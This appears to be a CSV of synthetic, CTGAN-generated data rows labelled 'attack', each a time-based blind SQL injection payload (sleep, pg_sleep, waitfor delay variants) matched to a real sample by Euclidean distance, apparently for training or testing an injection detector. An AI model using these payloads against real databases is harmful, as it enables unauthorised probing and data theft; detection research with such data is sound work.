id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000104,attack,time,1' and sleep  (  5  )   and 'kapr'  =  'kapr,nearest_attack_euclidean,R000268,7.03232498030013
CTGAN_000105,attack,time,1' or sleep  (  5  ) ,nearest_attack_euclidean,R000205,4.95485779722824
CTGAN_000106,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000069,4.613140831398304
CTGAN_000107,attack,time,1%'   )    )    and sleep  (  5  )  #,nearest_attack_euclidean,R000123,6.096557397518486
CTGAN_000108,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000209,7.346554322797798
CTGAN_000109,attack,time,"1' and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000250,7.493181308317401
CTGAN_000110,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000005,6.940920922616089
CTGAN_000111,attack,time,"1"" and sleep  (  5  )   and ""masm""  =  ""masm",nearest_attack_euclidean,R000201,5.6474377716696305
CTGAN_000112,attack,time,1'  )   and sleep  (  5  ) ,nearest_attack_euclidean,R000254,4.986997591791881
CTGAN_000113,attack,time,select pg_sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000219,7.0325500054723005
CTGAN_000114,attack,time,1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo,nearest_attack_euclidean,R000103,6.672782553546781
CTGAN_000115,attack,time,1'  )   or sleep  (  5  ) ,nearest_attack_euclidean,R000116,5.397999675291256
CTGAN_000116,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R000211,6.592729159082204
CTGAN_000117,attack,time,1' where 4403  =  4403 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000261,6.630655958453581
CTGAN_000118,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R000213,5.772682636736984
CTGAN_000119,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,7.45966988609676
CTGAN_000120,attack,time,"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000199,6.6169030977591845
CTGAN_000121,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000177,5.177995149676569
CTGAN_000122,attack,time,"1""   )    )    waitfor delay '0:0:5'--",nearest_attack_euclidean,R000267,5.836068272389447
CTGAN_000123,attack,time,select pg_sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000133,6.530187490652824
CTGAN_000124,attack,time,"1%"" rlike sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000104,7.071874871164246
CTGAN_000125,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,6.069209969795682
CTGAN_000126,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000039,6.693161278345154
CTGAN_000127,attack,time,"1%""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000283,6.356935907422094
CTGAN_000128,attack,time,"1%""  )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000176,6.036094411233275
CTGAN_000129,attack,time,1'   )    )     )   and sleep  (  5  )  #,nearest_attack_euclidean,R000078,6.870415001436257
CTGAN_000130,attack,time,1%' rlike sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000251,6.03499054133637
CTGAN_000131,attack,time,"1""  )   where 6679  =  6679 rlike sleep  (  5  )  #",nearest_attack_euclidean,R000227,5.407174274060108
CTGAN_000132,attack,time,1'  )   waitfor delay '0:0:5',nearest_attack_euclidean,R000185,7.181079088413379
CTGAN_000133,attack,time,1' where 4403  =  4403 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000261,6.29519065836825
CTGAN_000134,attack,time,select sleep  (  5  )   and   (  1435  =  1435,nearest_attack_euclidean,R000175,6.297042700910599
CTGAN_000135,attack,time,1%' and sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000163,8.144380615155708
CTGAN_000136,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000120,6.727854895028662
CTGAN_000137,attack,time,1   )    )    waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,6.629183637932437
CTGAN_000138,attack,time,"1%""  )   rlike sleep  (  5  )  #",nearest_attack_euclidean,R000126,6.228274183890513
CTGAN_000139,attack,time,select pg_sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000219,6.034792710675982
CTGAN_000140,attack,time,select sleep  (  5  )  -- waln,nearest_attack_euclidean,R000100,7.308733657412759
CTGAN_000141,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000177,6.708680578926802
CTGAN_000142,attack,time,"1""   )    )    waitfor delay '0:0:5'--",nearest_attack_euclidean,R000267,7.376879617911737
CTGAN_000143,attack,time,waitfor delay '0:0:5' and   (  'eaxu'  =  'eaxu,nearest_attack_euclidean,R000145,7.956085932707444
CTGAN_000144,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,5.228471533514592
CTGAN_000145,attack,time,1' and sleep  (  5  )   and 'kapr'  =  'kapr,nearest_attack_euclidean,R000268,6.357137077210962
CTGAN_000146,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000044,5.954275634292209
CTGAN_000147,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000044,7.192917890040426
CTGAN_000148,attack,time,1  )   waitfor delay '0:0:5',nearest_attack_euclidean,R000296,5.6919491332800165
CTGAN_000149,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000177,5.629671047401049
CTGAN_000150,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )   ",nearest_attack_euclidean,R000151,7.213098285322092
CTGAN_000151,attack,time,1'  )   and sleep  (  5  ) ,nearest_attack_euclidean,R000254,6.23691196767581
CTGAN_000152,attack,time,1%' rlike sleep  (  5  )  #,nearest_attack_euclidean,R000089,7.577621817603055
CTGAN_000153,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,7.056232528926943
CTGAN_000154,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000039,5.99213359847947
CTGAN_000155,attack,time,"1%""  )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000176,6.315749767846345
CTGAN_000156,attack,time,1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo,nearest_attack_euclidean,R000103,5.408686077270581
CTGAN_000157,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000069,7.1587748562796305
CTGAN_000158,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,6.817035648164771
CTGAN_000159,attack,time," select sleep  (  5  )   and   (  ""zsjw"" like ""zsjw",nearest_attack_euclidean,R000082,4.234942523510629
CTGAN_000160,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R000213,4.842921744370808
CTGAN_000161,attack,time,"select pg_sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000112,7.4675271897372495
CTGAN_000162,attack,time,1'   )    )    rlike sleep  (  5  )  #,nearest_attack_euclidean,R000243,5.043058271116966
CTGAN_000163,attack,time,"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000199,5.731566839875092
CTGAN_000164,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R000071,5.663588930491286
CTGAN_000165,attack,time,1%' rlike sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000251,8.331487671419676
CTGAN_000166,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000069,5.942755615132677
CTGAN_000167,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R000071,5.8288817303053495
CTGAN_000168,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000014,6.037391173417535
CTGAN_000169,attack,time,"1"" and sleep  (  5  )  ",nearest_attack_euclidean,R000192,5.608924747562543
CTGAN_000170,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000005,6.092494825917744
CTGAN_000171,attack,time,1'   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000287,6.578176564510176
CTGAN_000172,attack,time,select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,nearest_attack_euclidean,R000247,4.97982029728575
CTGAN_000173,attack,time,1%' rlike sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000251,7.519909198746414
CTGAN_000174,attack,time,1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,nearest_attack_euclidean,R000065,6.631933993622095
CTGAN_000175,attack,time,1  )   waitfor delay '0:0:5',nearest_attack_euclidean,R000296,5.967476076508293
CTGAN_000176,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000177,5.502641348497233
CTGAN_000177,attack,time,1'  )   and sleep  (  5  ) ,nearest_attack_euclidean,R000254,5.0340712363397095
CTGAN_000178,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000015,6.79902021109537
CTGAN_000179,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000069,5.945751792000475
CTGAN_000180,attack,time,"1"" and sleep  (  5  )   and ""masm""  =  ""masm",nearest_attack_euclidean,R000201,5.091238009453331
CTGAN_000181,attack,time,select pg_sleep  (  5  )   and 'rpka'  =  'rpka,nearest_attack_euclidean,R000086,6.214119307719151
CTGAN_000182,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000096,6.1833345307576195
CTGAN_000183,attack,time,1'   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000287,7.552243353823091
CTGAN_000184,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R000071,4.676547620268283
CTGAN_000185,attack,time,select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,nearest_attack_euclidean,R000059,5.967699725944966
CTGAN_000186,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000044,4.73780617249564
CTGAN_000187,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000005,7.007636666760798
CTGAN_000188,attack,time,1'  )   rlike sleep  (  5  ) ,nearest_attack_euclidean,R000144,7.3839276453757385
CTGAN_000189,attack,time,1   )    )    waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,5.650032851213611
CTGAN_000190,attack,time,1' or sleep  (  5  )   and 'yudo'  =  'yudo,nearest_attack_euclidean,R000216,6.221899013466198
CTGAN_000191,attack,time,1' where 9708  =  9708 or sleep  (  5  )  --,nearest_attack_euclidean,R000189,6.392874301131408
CTGAN_000192,attack,time,waitfor delay '0:0:5' and   (  'eaxu'  =  'eaxu,nearest_attack_euclidean,R000145,6.352425674982532
CTGAN_000193,attack,time,"1"" and sleep  (  5  )   and ""masm""  =  ""masm",nearest_attack_euclidean,R000201,5.700697718392675
CTGAN_000194,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,5.849528499881496
CTGAN_000195,attack,time,"make_set  (  8734  =  8734,sleep  (  5   )    )   ",nearest_attack_euclidean,R000288,6.37504599221624
CTGAN_000196,attack,time,select sleep  (  5  )   and 'mlmu'  =  'mlmu,nearest_attack_euclidean,R000298,5.686628958927628
CTGAN_000197,attack,time,1%'  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000292,5.572344111936693
CTGAN_000198,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000069,7.061775017130633
CTGAN_000199,attack,time,"1""  )   and sleep  (  5  )  #",nearest_attack_euclidean,R000225,5.258706951815435
CTGAN_000200,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000014,6.348207186698211
